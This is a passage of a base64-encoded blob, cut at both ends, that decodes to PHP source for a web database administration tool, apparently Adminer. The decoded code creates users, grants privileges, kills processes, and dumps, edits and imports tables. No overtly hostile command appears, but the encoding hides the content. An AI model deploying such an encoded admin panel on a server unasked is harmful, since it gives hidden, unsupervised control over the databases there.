gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgaWQ9ImZvcm0iPg0KPHRhYmxlIGNlbGxzcGFjaW5nPSIwIj4NCjx0cj48dGg+VGltZTx0ZD4nLGh0bWxfc2VsZWN0KCJUaW1pbmciLCR2aFsiVGltaW5nIl0sJEtbIlRpbWluZyJdLCJ0cmlnZ2VyQ2hhbmdlKC9eIi5wcmVnX3F1b3RlKCRhLCIvIikuIl9bYmFdW2l1ZF0kLywgJyIuanNfZXNjYXBlKCRhKS4iJywgdGhpcy5mb3JtKTsiKSwnPHRyPjx0aD5FdmVudDx0ZD4nLGh0bWxfc2VsZWN0KCJFdmVudCIsJHZoWyJFdmVudCJdLCRLWyJFdmVudCJdLCJ0aGlzLmZvcm1bJ1RpbWluZyddLm9uY2hhbmdlKCk7IiksKGluX2FycmF5KCJVUERBVEUgT0YiLCR2aFsiRXZlbnQiXSk/IiA8aW5wdXQgbmFtZT0nT2YnIHZhbHVlPSciLmgoJEtbIk9mIl0pLiInIGNsYXNzPSdoaWRkZW4nPiI6IiIpLCc8dHI+PHRoPlR5cGU8dGQ+JyxodG1sX3NlbGVjdCgiVHlwZSIsJHZoWyJUeXBlIl0sJEtbIlR5cGUiXSksJzwvdGFibGU+DQo8cD5OYW1lOiA8aW5wdXQgbmFtZT0iVHJpZ2dlciIgdmFsdWU9IicsaCgkS1siVHJpZ2dlciJdKTs/PiIgbWF4bGVuZ3RoPSI2NCIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Zvcm0nKVsnVGltaW5nJ10ub25jaGFuZ2UoKTs8L3NjcmlwdD4NCjxwPjw/cGhwIHRleHRhcmVhKCJTdGF0ZW1lbnQiLCRLWyJTdGF0ZW1lbnQiXSk7ZWNobyc8cD4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTYXZlIj4NCic7aWYoJEMhPSIiKXtlY2hvJzxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImRyb3AiIHZhbHVlPSJEcm9wIicsY29uZmlybSgpLCc+Jzt9ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbInVzZXIiXSkpeyRoYT0kX0dFVFsidXNlciJdOyREZj1hcnJheSgiIj0+YXJyYXkoIkFsbCBwcml2aWxlZ2VzIj0+IiIpKTtmb3JlYWNoKGdldF9yb3dzKCJTSE9XIFBSSVZJTEVHRVMiKWFzJEspe2ZvcmVhY2goZXhwbG9kZSgiLCIsKCRLWyJQcml2aWxlZ2UiXT09IkdyYW50IG9wdGlvbiI/IiI6JEtbIkNvbnRleHQiXSkpYXMkeGIpJERmWyR4Yl1bJEtbIlByaXZpbGVnZSJdXT0kS1siQ29tbWVudCJdO30kRGZbIlNlcnZlciBBZG1pbiJdKz0kRGZbIkZpbGUgYWNjZXNzIG9uIHNlcnZlciJdOyREZlsiRGF0YWJhc2VzIl1bIkNyZWF0ZSByb3V0aW5lIl09JERmWyJQcm9jZWR1cmVzIl1bIkNyZWF0ZSByb3V0aW5lIl07dW5zZXQoJERmWyJQcm9jZWR1cmVzIl1bIkNyZWF0ZSByb3V0aW5lIl0pOyREZlsiQ29sdW1ucyJdPWFycmF5KCk7Zm9yZWFjaChhcnJheSgiU2VsZWN0IiwiSW5zZXJ0IiwiVXBkYXRlIiwiUmVmZXJlbmNlcyIpYXMkWCkkRGZbIkNvbHVtbnMiXVskWF09JERmWyJUYWJsZXMiXVskWF07dW5zZXQoJERmWyJTZXJ2ZXIgQWRtaW4iXVsiVXNhZ2UiXSk7Zm9yZWFjaCgkRGZbIlRhYmxlcyJdYXMkeD0+JFgpdW5zZXQoJERmWyJEYXRhYmFzZXMiXVskeF0pOyR2ZT1hcnJheSgpO2lmKCRfUE9TVCl7Zm9yZWFjaCgkX1BPU1RbIm9iamVjdHMiXWFzJHg9PiRYKSR2ZVskWF09KGFycmF5KSR2ZVskWF0rKGFycmF5KSRfUE9TVFsiZ3JhbnRzIl1bJHhdO30kVWM9YXJyYXkoKTskR2U9IiI7aWYoaXNzZXQoJF9HRVRbImhvc3QiXSkmJigkST0kZy0+cXVlcnkoIlNIT1cgR1JBTlRTIEZPUiAiLnEoJGhhKS4iQCIucSgkX0dFVFsiaG9zdCJdKSkpKXt3aGlsZSgkSz0kSS0+ZmV0Y2hfcm93KCkpe2lmKHByZWdfbWF0Y2goJ35HUkFOVCAoLiopIE9OICguKikgVE8gficsJEtbMF0sJEIpJiZwcmVnX21hdGNoX2FsbCgnfiAqKFteKCxdKlteICwoXSkoICpcXChbXildK1xcKSk/ficsJEJbMV0sJGFlLFBSRUdfU0VUX09SREVSKSl7Zm9yZWFjaCgkYWUNCmFzJFgpe2lmKCRYWzFdIT0iVVNBR0UiKSRVY1siJEJbMl0kWFsyXSJdWyRYWzFdXT10cnVlO2lmKHByZWdfbWF0Y2goJ34gV0lUSCBHUkFOVCBPUFRJT05+JywkS1swXSkpJFVjWyIkQlsyXSRYWzJdIl1bIkdSQU5UIE9QVElPTiJdPXRydWU7fX1pZihwcmVnX21hdGNoKCJ+IElERU5USUZJRUQgQlkgUEFTU1dPUkQgJyhbXiddKyl+IiwkS1swXSwkQikpJEdlPSRCWzFdO319aWYoJF9QT1NUJiYhJG4peyRIZT0oaXNzZXQoJF9HRVRbImhvc3QiXSk/cSgkaGEpLiJAIi5xKCRfR0VUWyJob3N0Il0pOiInJyIpO2lmKCRfUE9TVFsiZHJvcCJdKXF1ZXJ5X3JlZGlyZWN0KCJEUk9QIFVTRVIgJEhlIixNRS4icHJpdmlsZWdlcz0iLCdVc2VyIGhhcyBiZWVuIGRyb3BwZWQuJyk7ZWxzZXskeGU9cSgkX1BPU1RbInVzZXIiXSkuIkAiLnEoJF9QT1NUWyJob3N0Il0pOyRtZj0kX1BPU1RbInBhc3MiXTtpZigkbWYhPScnJiYhJF9QT1NUWyJoYXNoZWQiXSl7JG1mPSRnLT5yZXN1bHQoIlNFTEVDVCBQQVNTV09SRCgiLnEoJG1mKS4iKSIpOyRuPSEkbWY7fSRCYj1mYWxzZTtpZighJG4pe2lmKCRIZSE9JHhlKXskQmI9cXVlcmllcygoJGctPnNlcnZlcl9pbmZvPDU/IkdSQU5UIFVTQUdFIE9OICouKiBUTyI6IkNSRUFURSBVU0VSIikuIiAkeGUgSURFTlRJRklFRCBCWSBQQVNTV09SRCAiLnEoJG1mKSk7JG49ISRCYjt9ZWxzZWlmKCRtZiE9JEdlKXF1ZXJpZXMoIlNFVCBQQVNTV09SRCBGT1IgJHhlID0gIi5xKCRtZikpO31pZighJG4peyRiZz1hcnJheSgpO2ZvcmVhY2goJHZlDQphcyRCZT0+JFRjKXtpZihpc3NldCgkX0dFVFsiZ3JhbnQiXSkpJFRjPWFycmF5X2ZpbHRlcigkVGMpOyRUYz1hcnJheV9rZXlzKCRUYyk7aWYoaXNzZXQoJF9HRVRbImdyYW50Il0pKSRiZz1hcnJheV9kaWZmKGFycmF5X2tleXMoYXJyYXlfZmlsdGVyKCR2ZVskQmVdLCdzdHJsZW4nKSksJFRjKTtlbHNlaWYoJEhlPT0keGUpeyRFZT1hcnJheV9rZXlzKChhcnJheSkkVWNbJEJlXSk7JGJnPWFycmF5X2RpZmYoJEVlLCRUYyk7JFRjPWFycmF5X2RpZmYoJFRjLCRFZSk7dW5zZXQoJFVjWyRCZV0pO31pZihwcmVnX21hdGNoKCd+XiguKylcXHMqKFxcKC4qXFwpKT8kflUnLCRCZSwkQikmJighZ3JhbnQoIlJFVk9LRSIsJGJnLCRCWzJdLCIgT04gJEJbMV0gRlJPTSAkeGUiKXx8IWdyYW50KCJHUkFOVCIsJFRjLCRCWzJdLCIgT04gJEJbMV0gVE8gJHhlIikpKXskbj10cnVlO2JyZWFrO319fWlmKCEkbiYmaXNzZXQoJF9HRVRbImhvc3QiXSkpe2lmKCRIZSE9JHhlKXF1ZXJpZXMoIkRST1AgVVNFUiAkSGUiKTtlbHNlaWYoIWlzc2V0KCRfR0VUWyJncmFudCJdKSl7Zm9yZWFjaCgkVWMNCmFzJEJlPT4kYmcpe2lmKHByZWdfbWF0Y2goJ35eKC4rKShcXCguKlxcKSk/JH5VJywkQmUsJEIpKWdyYW50KCJSRVZPS0UiLGFycmF5X2tleXMoJGJnKSwkQlsyXSwiIE9OICRCWzFdIEZST00gJHhlIik7fX19cXVlcmllc19yZWRpcmVjdChNRS4icHJpdmlsZWdlcz0iLChpc3NldCgkX0dFVFsiaG9zdCJdKT8nVXNlciBoYXMgYmVlbiBhbHRlcmVkLic6J1VzZXIgaGFzIGJlZW4gY3JlYXRlZC4nKSwhJG4pO2lmKCRCYikkZy0+cXVlcnkoIkRST1AgVVNFUiAkeGUiKTt9fXBhZ2VfaGVhZGVyKChpc3NldCgkX0dFVFsiaG9zdCJdKT8nVXNlcm5hbWUnLiI6ICIuaCgiJGhhQCRfR0VUW2hvc3RdIik6J0NyZWF0ZSB1c2VyJyksJG4sYXJyYXkoInByaXZpbGVnZXMiPT5hcnJheSgnJywnUHJpdmlsZWdlcycpKSk7aWYoJF9QT1NUKXskSz0kX1BPU1Q7JFVjPSR2ZTt9ZWxzZXskSz0kX0dFVCthcnJheSgiaG9zdCI9PiRnLT5yZXN1bHQoIlNFTEVDVCBTVUJTVFJJTkdfSU5ERVgoQ1VSUkVOVF9VU0VSLCAnQCcsIC0xKSIpKTskS1sicGFzcyJdPSRHZTtpZigkR2UhPSIiKSRLWyJoYXNoZWQiXT10cnVlOyRVY1soREI9PSIifHwkVWM/IiI6aWRmX2VzY2FwZShhZGRjc2xhc2hlcyhEQiwiJV9cXCIpKSkuIi4qIl09YXJyYXkoKTt9ZWNobyc8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4NCjx0YWJsZSBjZWxsc3BhY2luZz0iMCI+DQo8dHI+PHRoPlNlcnZlcjx0ZD48aW5wdXQgbmFtZT0iaG9zdCIgbWF4bGVuZ3RoPSI2MCIgdmFsdWU9IicsaCgkS1siaG9zdCJdKSwnIiBhdXRvY2FwaXRhbGl6ZT0ib2ZmIj4NCjx0cj48dGg+VXNlcm5hbWU8dGQ+PGlucHV0IG5hbWU9InVzZXIiIG1heGxlbmd0aD0iMTYiIHZhbHVlPSInLGgoJEtbInVzZXIiXSksJyIgYXV0b2NhcGl0YWxpemU9Im9mZiI+DQo8dHI+PHRoPlBhc3N3b3JkPHRkPjxpbnB1dCBuYW1lPSJwYXNzIiBpZD0icGFzcyIgdmFsdWU9IicsaCgkS1sicGFzcyJdKSwnIj4NCic7aWYoISRLWyJoYXNoZWQiXSl7ZWNobyc8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+dHlwZVBhc3N3b3JkKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKFwncGFzc1wnKSk7PC9zY3JpcHQ+Jzt9ZWNobw0KY2hlY2tib3goImhhc2hlZCIsMSwkS1siaGFzaGVkIl0sJ0hhc2hlZCcsInR5cGVQYXNzd29yZCh0aGlzLmZvcm1bJ3Bhc3MnXSwgdGhpcy5jaGVja2VkKTsiKSwnPC90YWJsZT4NCg0KJztlY2hvIjx0YWJsZSBjZWxsc3BhY2luZz0nMCc+XG4iLCI8dGhlYWQ+PHRyPjx0aCBjb2xzcGFuPScyJz4iLidQcml2aWxlZ2VzJy5kb2NfbGluayhhcnJheSgnc3FsJz0+ImdyYW50Lmh0bWwjcHJpdl9sZXZlbCIpKTskcz0wO2ZvcmVhY2goJFVjDQphcyRCZT0+JFRjKXtlY2hvJzx0aD4nLigkQmUhPSIqLioiPyI8aW5wdXQgbmFtZT0nb2JqZWN0c1skc10nIHZhbHVlPSciLmgoJEJlKS4iJyBzaXplPScxMCcgYXV0b2NhcGl0YWxpemU9J29mZic+IjoiPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nb2JqZWN0c1skc10nIHZhbHVlPScqLionIHNpemU9JzEwJz4qLioiKTskcysrO31lY2hvIjwvdGhlYWQ+XG4iO2ZvcmVhY2goYXJyYXkoIiI9PiIiLCJTZXJ2ZXIgQWRtaW4iPT4nU2VydmVyJywiRGF0YWJhc2VzIj0+J0RhdGFiYXNlJywiVGFibGVzIj0+J1RhYmxlJywiQ29sdW1ucyI9PidDb2x1bW4nLCJQcm9jZWR1cmVzIj0+J1JvdXRpbmUnLClhcyR4Yj0+JE1iKXtmb3JlYWNoKChhcnJheSkkRGZbJHhiXWFzJENmPT4kcWIpe2VjaG8iPHRyIi5vZGQoKS4iPjx0ZCIuKCRNYj8iPiRNYjx0ZCI6IiBjb2xzcGFuPScyJyIpLicgbGFuZz0iZW4iIHRpdGxlPSInLmgoJHFiKS4nIj4nLmgoJENmKTskcz0wO2ZvcmVhY2goJFVjDQphcyRCZT0+JFRjKXskQz0iJ2dyYW50c1skc11bIi5oKHN0cnRvdXBwZXIoJENmKSkuIl0nIjskWT0kVGNbc3RydG91cHBlcigkQ2YpXTtpZigkeGI9PSJTZXJ2ZXIgQWRtaW4iJiYkQmUhPShpc3NldCgkVWNbIiouKiJdKT8iKi4qIjoiLioiKSllY2hvIjx0ZD4mbmJzcDsiO2Vsc2VpZihpc3NldCgkX0dFVFsiZ3JhbnQiXSkpZWNobyI8dGQ+PHNlbGVjdCBuYW1lPSRDPjxvcHRpb24+PG9wdGlvbiB2YWx1ZT0nMSciLigkWT8iIHNlbGVjdGVkIjoiIikuIj4iLidHcmFudCcuIjxvcHRpb24gdmFsdWU9JzAnIi4oJFk9PSIwIj8iIHNlbGVjdGVkIjoiIikuIj4iLidSZXZva2UnLiI8L3NlbGVjdD4iO2Vsc2UNCmVjaG8iPHRkIGFsaWduPSdjZW50ZXInPjxsYWJlbCBjbGFzcz0nYmxvY2snPjxpbnB1dCB0eXBlPSdjaGVja2JveCcgbmFtZT0kQyB2YWx1ZT0nMSciLigkWT8iIGNoZWNrZWQiOiIiKS4oJENmPT0iQWxsIHByaXZpbGVnZXMiPyIgaWQ9J2dyYW50cy0kcy1hbGwnIjooJENmPT0iR3JhbnQgb3B0aW9uIj8iIjoiIG9uY2xpY2s9XCJpZiAodGhpcy5jaGVja2VkKSBmb3JtVW5jaGVjaygnZ3JhbnRzLSRzLWFsbCcpO1wiIikpLiI+PC9sYWJlbD4iOyRzKys7fX19ZWNobyI8L3RhYmxlPlxuIiwnPHA+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU2F2ZSI+DQonO2lmKGlzc2V0KCRfR0VUWyJob3N0Il0pKXtlY2hvJzxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImRyb3AiIHZhbHVlPSJEcm9wIicsY29uZmlybSgpLCc+Jzt9ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbInByb2Nlc3NsaXN0Il0pKXtpZihzdXBwb3J0KCJraWxsIikmJiRfUE9TVCYmISRuKXskS2Q9MDtmb3JlYWNoKChhcnJheSkkX1BPU1RbImtpbGwiXWFzJFgpe2lmKGtpbGxfcHJvY2VzcygkWCkpJEtkKys7fXF1ZXJpZXNfcmVkaXJlY3QoTUUuInByb2Nlc3NsaXN0PSIsbGFuZyhhcnJheSgnJWQgcHJvY2VzcyBoYXMgYmVlbiBraWxsZWQuJywnJWQgcHJvY2Vzc2VzIGhhdmUgYmVlbiBraWxsZWQuJyksJEtkKSwkS2R8fCEkX1BPU1RbImtpbGwiXSk7fXBhZ2VfaGVhZGVyKCdQcm9jZXNzIGxpc3QnLCRuKTtlY2hvJw0KPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQo8dGFibGUgY2VsbHNwYWNpbmc9IjAiIG9uY2xpY2s9InRhYmxlQ2xpY2soZXZlbnQpOyIgb25kYmxjbGljaz0idGFibGVDbGljayhldmVudCwgdHJ1ZSk7IiBjbGFzcz0ibm93cmFwIGNoZWNrYWJsZSI+DQonOyRzPS0xO2ZvcmVhY2gocHJvY2Vzc19saXN0KClhcyRzPT4kSyl7aWYoISRzKXtlY2hvIjx0aGVhZD48dHIgbGFuZz0nZW4nPiIuKHN1cHBvcnQoImtpbGwiKT8iPHRoPiZuYnNwOyI6IiIpO2ZvcmVhY2goJEsNCmFzJHg9PiRYKWVjaG8iPHRoPiR4Ii5kb2NfbGluayhhcnJheSgnc3FsJz0+InNob3ctcHJvY2Vzc2xpc3QuaHRtbCNwcm9jZXNzbGlzdF8iLnN0cnRvbG93ZXIoJHgpLCdwZ3NxbCc9PiJtb25pdG9yaW5nLXN0YXRzLmh0bWwjUEctU1RBVC1BQ1RJVklUWS1WSUVXIiwnb3JhY2xlJz0+Ii4uL2IxNDIzNy9keW52aWV3c18yMDg4Lmh0bSIsKSk7ZWNobyI8L3RoZWFkPlxuIjt9ZWNobyI8dHIiLm9kZCgpLiI+Ii4oc3VwcG9ydCgia2lsbCIpPyI8dGQ+Ii5jaGVja2JveCgia2lsbFtdIiwkS1skdz09InNxbCI/IklkIjoicGlkIl0sMCk6IiIpO2ZvcmVhY2goJEsNCmFzJHg9PiRYKWVjaG8iPHRkPiIuKCgkdz09InNxbCImJiR4PT0iSW5mbyImJnByZWdfbWF0Y2goIn5RdWVyeXxLaWxsZWR+IiwkS1siQ29tbWFuZCJdKSYmJFghPSIiKXx8KCR3PT0icGdzcWwiJiYkeD09ImN1cnJlbnRfcXVlcnkiJiYkWCE9IjxJRExFPiIpfHwoJHc9PSJvcmFjbGUiJiYkeD09InNxbF90ZXh0IiYmJFghPSIiKT8iPGNvZGUgY2xhc3M9J2p1c2gtJHcnPiIuc2hvcnRlbl91dGY4KCRYLDEwMCwiPC9jb2RlPiIpLicgPGEgaHJlZj0iJy5oKE1FLigkS1siZGIiXSE9IiI/ImRiPSIudXJsZW5jb2RlKCRLWyJkYiJdKS4iJiI6IiIpLiJzcWw9Ii51cmxlbmNvZGUoJFgpKS4nIj4nLidDbG9uZScuJzwvYT4nOm5ic3AoJFgpKTtlY2hvIlxuIjt9ZWNobyc8L3RhYmxlPg0KPHNjcmlwdCB0eXBlPVwndGV4dC9qYXZhc2NyaXB0XCc+dGFibGVDaGVjaygpOzwvc2NyaXB0Pg0KPHA+DQonO2lmKHN1cHBvcnQoImtpbGwiKSl7ZWNobygkcysxKS4iLyIuc3ByaW50ZignJWQgaW4gdG90YWwnLG1heF9jb25uZWN0aW9ucygpKSwiPHA+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9JyIuJ0tpbGwnLiInPlxuIjt9ZWNobyc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b2tlbiIgdmFsdWU9IicsJFQsJyI+DQo8L2Zvcm0+DQonO31lbHNlaWYoaXNzZXQoJF9HRVRbInNlbGVjdCJdKSl7JGE9JF9HRVRbInNlbGVjdCJdOyRSPXRhYmxlX3N0YXR1czEoJGEpOyR2PWluZGV4ZXMoJGEpOyRwPWZpZWxkcygkYSk7JE1jPWNvbHVtbl9mb3JlaWduX2tleXMoJGEpOyREZT0iIjtpZigkUlsiT2lkIl0peyREZT0oJHc9PSJzcWxpdGUiPyJyb3dpZCI6Im9pZCIpOyR2W109YXJyYXkoInR5cGUiPT4iUFJJTUFSWSIsImNvbHVtbnMiPT5hcnJheSgkRGUpKTt9cGFyc2Vfc3RyKCRfQ09PS0lFWyJhZG1pbmVyX2ltcG9ydCJdLCR4YSk7JGNnPWFycmF5KCk7JGY9YXJyYXkoKTskZWg9bnVsbDtmb3JlYWNoKCRwDQphcyR4PT4kbyl7JEM9JGItPmZpZWxkTmFtZSgkbyk7aWYoaXNzZXQoJG9bInByaXZpbGVnZXMiXVsic2VsZWN0Il0pJiYkQyE9IiIpeyRmWyR4XT1odG1sX2VudGl0eV9kZWNvZGUoc3RyaXBfdGFncygkQyksRU5UX1FVT1RFUyk7aWYoaXNfc2hvcnRhYmxlKCRvKSkkZWg9JGItPnNlbGVjdExlbmd0aFByb2Nlc3MoKTt9JGNnKz0kb1sicHJpdmlsZWdlcyJdO31saXN0KCRNLCRWYyk9JGItPnNlbGVjdENvbHVtbnNQcm9jZXNzKCRmLCR2KTskemQ9Y291bnQoJFZjKTxjb3VudCgkTSk7JFo9JGItPnNlbGVjdFNlYXJjaFByb2Nlc3MoJHAsJHYpOyRUZT0kYi0+c2VsZWN0T3JkZXJQcm9jZXNzKCRwLCR2KTskej0kYi0+c2VsZWN0TGltaXRQcm9jZXNzKCk7JFJjPSgkTT9pbXBsb2RlKCIsICIsJE0pOiIqIi4oJERlPyIsICREZSI6IiIpKS5jb252ZXJ0X2ZpZWxkcygkZiwkcCwkTSkuIlxuRlJPTSAiLnRhYmxlKCRhKTskV2M9KCRWYyYmJHpkPyJcbkdST1VQIEJZICIuaW1wbG9kZSgiLCAiLCRWYyk6IiIpLigkVGU/IlxuT1JERVIgQlkgIi5pbXBsb2RlKCIsICIsJFRlKToiIik7aWYoJF9HRVRbInZhbCJdJiZpc19hamF4KCkpe2hlYWRlcigiQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluOyBjaGFyc2V0PXV0Zi04Iik7Zm9yZWFjaCgkX0dFVFsidmFsIl1hcyRDaD0+JEspeyRGYT1jb252ZXJ0X2ZpZWxkKCRwW2tleSgkSyldKTskTT1hcnJheSgkRmE/JEZhOmlkZl9lc2NhcGUoa2V5KCRLKSkpOyRaW109d2hlcmVfY2hlY2soJENoLCRwKTskSj0kVWItPnNlbGVjdCgkYSwkTSwkWiwkTSk7aWYoJEopZWNobw0KcmVzZXQoJEotPmZldGNoX3JvdygpKTt9ZXhpdDt9aWYoJF9QT1NUJiYhJG4peyRaaD0kWjtpZighJF9QT1NUWyJhbGwiXSYmaXNfYXJyYXkoJF9QT1NUWyJjaGVjayJdKSl7JGRiPWFycmF5KCk7Zm9yZWFjaCgkX1BPU1RbImNoZWNrIl1hcyRhYikkZGJbXT13aGVyZV9jaGVjaygkYWIsJHApOyRaaFtdPSIoKCIuaW1wbG9kZSgiKSBPUiAoIiwkZGIpLiIpKSI7fSRaaD0oJFpoPyJcbldIRVJFICIuaW1wbG9kZSgiIEFORCAiLCRaaCk6IiIpOyR6Zj0kRWg9bnVsbDtmb3JlYWNoKCR2DQphcyR1KXtpZigkdVsidHlwZSJdPT0iUFJJTUFSWSIpeyR6Zj1hcnJheV9mbGlwKCR1WyJjb2x1bW5zIl0pOyRFaD0oJE0/JHpmOmFycmF5KCkpO2JyZWFrO319Zm9yZWFjaCgoYXJyYXkpJEVoDQphcyR4PT4kWCl7aWYoaW5fYXJyYXkoaWRmX2VzY2FwZSgkeCksJE0pKXVuc2V0KCRFaFskeF0pO31pZigkX1BPU1RbImV4cG9ydCJdKXtjb29raWUoImFkbWluZXJfaW1wb3J0Iiwib3V0cHV0PSIudXJsZW5jb2RlKCRfUE9TVFsib3V0cHV0Il0pLiImZm9ybWF0PSIudXJsZW5jb2RlKCRfUE9TVFsiZm9ybWF0Il0pKTtkdW1wX2hlYWRlcnMoJGEpOyRiLT5kdW1wVGFibGUoJGEsIiIpO2lmKCFpc19hcnJheSgkX1BPU1RbImNoZWNrIl0pfHwkRWg9PT1hcnJheSgpKSRIPSJTRUxFQ1QgJFJjJFpoJFdjIjtlbHNleyRBaD1hcnJheSgpO2ZvcmVhY2goJF9QT1NUWyJjaGVjayJdYXMkWCkkQWhbXT0iKFNFTEVDVCIubGltaXQoJFJjLCJcbldIRVJFICIuKCRaP2ltcGxvZGUoIiBBTkQgIiwkWikuIiBBTkQgIjoiIikud2hlcmVfY2hlY2soJFgsJHApLiRXYywxKS4iKSI7JEg9aW1wbG9kZSgiIFVOSU9OIEFMTCAiLCRBaCk7fSRiLT5kdW1wRGF0YSgkYSwidGFibGUiLCRIKTtleGl0O31pZighJGItPnNlbGVjdEVtYWlsUHJvY2VzcygkWiwkTWMpKXtpZigkX1BPU1RbInNhdmUiXXx8JF9QT1NUWyJkZWxldGUiXSl7JEk9dHJ1ZTskeWE9MDskTz1hcnJheSgpO2lmKCEkX1BPU1RbImRlbGV0ZSJdKXtmb3JlYWNoKCRmDQphcyRDPT4kWCl7JFg9cHJvY2Vzc19pbnB1dCgkcFskQ10pO2lmKCRYIT09bnVsbCYmKCRfUE9TVFsiY2xvbmUiXXx8JFghPT1mYWxzZSkpJE9baWRmX2VzY2FwZSgkQyldPSgkWCE9PWZhbHNlPyRYOmlkZl9lc2NhcGUoJEMpKTt9fWlmKCRfUE9TVFsiZGVsZXRlIl18fCRPKXtpZigkX1BPU1RbImNsb25lIl0pJEg9IklOVE8gIi50YWJsZSgkYSkuIiAoIi5pbXBsb2RlKCIsICIsYXJyYXlfa2V5cygkTykpLiIpXG5TRUxFQ1QgIi5pbXBsb2RlKCIsICIsJE8pLiJcbkZST00gIi50YWJsZSgkYSk7aWYoJF9QT1NUWyJhbGwiXXx8KCRFaD09PWFycmF5KCkmJmlzX2FycmF5KCRfUE9TVFsiY2hlY2siXSkpfHwkemQpeyRJPSgkX1BPU1RbImRlbGV0ZSJdPyRVYi0+ZGVsZXRlKCRhLCRaaCk6KCRfUE9TVFsiY2xvbmUiXT9xdWVyaWVzKCJJTlNFUlQgJEgkWmgiKTokVWItPnVwZGF0ZSgkYSwkTywkWmgpKSk7JHlhPSRnLT5hZmZlY3RlZF9yb3dzO31lbHNle2ZvcmVhY2goKGFycmF5KSRfUE9TVFsiY2hlY2siXWFzJFgpeyRZaD0iXG5XSEVSRSAiLigkWj9pbXBsb2RlKCIgQU5EICIsJFopLiIgQU5EICI6IiIpLndoZXJlX2NoZWNrKCRYLCRwKTskST0oJF9QT1NUWyJkZWxldGUiXT8kVWItPmRlbGV0ZSgkYSwkWWgsMSk6KCRfUE9TVFsiY2xvbmUiXT9xdWVyaWVzKCJJTlNFUlQiLmxpbWl0MSgkSCwkWWgpKTokVWItPnVwZGF0ZSgkYSwkTywkWWgpKSk7aWYoISRJKWJyZWFrOyR5YSs9JGctPmFmZmVjdGVkX3Jvd3M7fX19JGllPWxhbmcoYXJyYXkoJyVkIGl0ZW0gaGFzIGJlZW4gYWZmZWN0ZWQuJywnJWQgaXRlbXMgaGF2ZSBiZWVuIGFmZmVjdGVkLicpLCR5YSk7aWYoJF9QT1NUWyJjbG9uZSJdJiYkSSYmJHlhPT0xKXskT2Q9bGFzdF9pZCgpO2lmKCRPZCkkaWU9c3ByaW50ZignSXRlbSVzIGhhcyBiZWVuIGluc2VydGVkLicsIiAkT2QiKTt9cXVlcmllc19yZWRpcmVjdChyZW1vdmVfZnJvbV91cmkoJF9QT1NUWyJhbGwiXSYmJF9QT1NUWyJkZWxldGUiXT8icGFnZSI6IiIpLCRpZSwkSSk7aWYoISRfUE9TVFsiZGVsZXRlIl0pe2VkaXRfZm9ybSgkYSwkcCwoYXJyYXkpJF9QT1NUWyJmaWVsZHMiXSwhJF9QT1NUWyJjbG9uZSJdKTtwYWdlX2Zvb3RlcigpO2V4aXQ7fX1lbHNlaWYoISRfUE9TVFsiaW1wb3J0Il0pe2lmKCEkX1BPU1RbInZhbCJdKSRuPSdDdHJsK2NsaWNrIG9uIGEgdmFsdWUgdG8gbW9kaWZ5IGl0Lic7ZWxzZXskST10cnVlOyR5YT0wO2ZvcmVhY2goJF9QT1NUWyJ2YWwiXWFzJENoPT4kSyl7JE89YXJyYXkoKTtmb3JlYWNoKCRLDQphcyR4PT4kWCl7JHg9YnJhY2tldF9lc2NhcGUoJHgsMSk7JE9baWRmX2VzY2FwZSgkeCldPShwcmVnX21hdGNoKCd+Y2hhcnx0ZXh0ficsJHBbJHhdWyJ0eXBlIl0pfHwkWCE9IiI/JGItPnByb2Nlc3NJbnB1dCgkcFskeF0sJFgpOiJOVUxMIik7fSRJPSRVYi0+dXBkYXRlKCRhLCRPLCIgV0hFUkUgIi4oJFo/aW1wbG9kZSgiIEFORCAiLCRaKS4iIEFORCAiOiIiKS53aGVyZV9jaGVjaygkQ2gsJHApLCEoJHpkfHwkRWg9PT1hcnJheSgpKSwiICIpO2lmKCEkSSlicmVhazskeWErPSRnLT5hZmZlY3RlZF9yb3dzO31xdWVyaWVzX3JlZGlyZWN0KHJlbW92ZV9mcm9tX3VyaSgpLGxhbmcoYXJyYXkoJyVkIGl0ZW0gaGFzIGJlZW4gYWZmZWN0ZWQuJywnJWQgaXRlbXMgaGF2ZSBiZWVuIGFmZmVjdGVkLicpLCR5YSksJEkpO319ZWxzZWlmKCFpc19zdHJpbmcoJEZjPWdldF9maWxlKCJjc3ZfZmlsZSIsdHJ1ZSkpKSRuPXVwbG9hZF9lcnJvcigkRmMpO2Vsc2VpZighcHJlZ19tYXRjaCgnfn51JywkRmMpKSRuPSdGaWxlIG11c3QgYmUgaW4gVVRGLTggZW5jb2RpbmcuJztlbHNle2Nvb2tpZSgiYWRtaW5lcl9pbXBvcnQiLCJvdXRwdXQ9Ii51cmxlbmNvZGUoJHhhWyJvdXRwdXQiXSkuIiZmb3JtYXQ9Ii51cmxlbmNvZGUoJF9QT1NUWyJzZXBhcmF0b3IiXSkpOyRJPXRydWU7JG5iPWFycmF5X2tleXMoJHApO3ByZWdfbWF0Y2hfYWxsKCd+KD8+IlteIl0qInxbXiJcXHJcXG5dKykrficsJEZjLCRhZSk7JHlhPWNvdW50KCRhZVswXSk7JFViLT5iZWdpbigpOyRyZz0oJF9QT1NUWyJzZXBhcmF0b3IiXT09ImNzdiI/Ii